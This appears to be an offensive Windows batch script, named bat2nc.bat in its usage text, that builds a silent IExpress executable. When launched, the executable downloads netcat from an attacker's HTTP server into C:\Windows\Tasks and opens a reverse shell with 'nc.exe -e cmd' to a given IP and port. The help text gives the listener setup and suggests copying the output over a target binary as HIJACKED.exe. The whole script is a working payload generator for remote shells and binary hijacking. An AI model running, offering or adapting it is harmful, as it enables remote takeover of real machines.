@echo off
setlocal enabledelayedexpansion
if "%1"=="" goto err
if "%2"=="" goto err
set "i=%2"
set "p=%3"
set "s=%1"
set "t=Z:\x.exe"
set "b=Z:\x.bat"
set "n=x.bat"
set "d=Z:\"
subst Z: "%~dp0"
> "%b%" echo @echo off
>> "%b%" echo powershell -c "Get-Process x -ErrorAction SilentlyContinue | Stop-Process -Force"
>> "%b%" echo powershell -c "if (-Not (Test-Path C:\Windows\Tasks\nc.exe)) { C:\Windows\System32\curl %s% -o C:\Windows\Tasks\nc.exe }"
>> "%b%" echo powershell -c "if (-Not (Test-Path C:\Windows\Tasks\nc.exe)) { powershell -c iwr -Uri %s% -OutFile C:\Windows\Tasks\nc.exe }"
>> "%b%" echo start /b cmd /c C:\Windows\Tasks\nc.exe -e cmd %i% %p%
>> "%b%" echo PAUSE
>> "%b%" echo exit
(
echo [Version]
echo Class=IEXPRESS
echo SEDVersion=3
echo [Options]
echo PackagePurpose=InstallApp
echo ShowInstallProgramWindow=0
echo HideExtractAnimation=1
echo UseLongFileName=1
echo InsideCompressed=0
echo CAB_FixedSize=0
echo CAB_ResvCodeSigning=0
echo RebootMode=N
echo InstallPrompt=
echo DisplayLicense=
echo FinishMessage=
echo TargetName=!t!
echo FriendlyName=w
echo AppLaunched=cmd /c !n!
echo PostInstallCmd=^<None^>
echo AdminQuietInstCmd=
echo UserQuietInstCmd=
echo SourceFiles=SourceFiles
echo [SourceFiles]
echo SourceFiles0=!d!
echo [SourceFiles0]
echo !n!=
) > "Z:\2.sed"
iexpress /n /q /m Z:\2.sed
subst Z: /d
del /f "%~dp0x.bat" "%~dp02.sed"
goto :eof
:err
echo -------------------------------------------
echo    Pre-requisites: python3 -m http.server -d . & nc -lvnp 53
echo -------------------------------------------
echo    Usage: .\bat2nc.bat http://172.100.152.10:8000/nc.exe 172.100.152.10 53
echo            copy x.exe HIJACKED.exe
echo -------------------------------------------
echo    Clean-up: del C:\Windows\Tasks\nc.exe
echo -------------------------------------------
exit /b 1
